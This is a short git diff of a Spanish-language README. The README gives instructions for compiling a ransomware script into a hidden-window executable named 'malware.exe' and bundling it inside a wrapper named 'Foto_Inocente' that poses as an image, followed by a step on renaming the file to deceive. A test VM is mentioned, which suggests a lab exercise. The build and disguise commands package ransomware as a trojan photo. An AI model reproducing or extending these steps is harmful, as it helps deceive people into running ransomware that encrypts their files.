@@ -20,7 +20,7 @@ pip install cryptography pyinstaller
 
 ```bash
 # Crea un .exe de 64 bits (asegúrate de usar Python 64-bit)
-pyinstaller --onefile --noconsole --name=malware ransomware.py
+pyinstaller --onefile --noconsole --name=malware joseo.PY
 ```
 
 El ejecutable `malware.exe` estará en la carpeta `/dist`.
@@ -33,7 +33,7 @@ copy dist\malware.exe .
 copy tu_imagen_real.png imagen.png
 
 # Compila el wrapper
-pyinstaller --onefile --noconsole --name="Foto_Inocente" wrapper_simple.py
+pyinstaller --onefile --noconsole --name="Foto_Inocente" wrapper.py
 ```
 
 ### 4. Renombrar para engañar (en la VM de prueba)
